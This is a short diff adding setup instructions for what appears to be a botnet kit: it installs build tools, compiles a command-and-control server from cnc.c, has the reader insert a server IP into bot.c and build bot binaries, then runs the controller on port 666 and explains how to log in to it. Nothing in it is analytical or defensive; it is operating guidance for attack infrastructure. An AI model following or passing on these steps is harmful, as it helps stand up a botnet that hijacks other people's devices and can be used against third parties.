@@ -1,0 +1,8 @@
+yum install gcc screen wget -y
+gcc cnc.c -o cnc -pthread
+replace server ip in bot.c in line 1101
+python build.py bot.c serverip
+screen ./cnc botport 10
+connection type is raw
+cnc port is 666
+type 666 on the blank screen
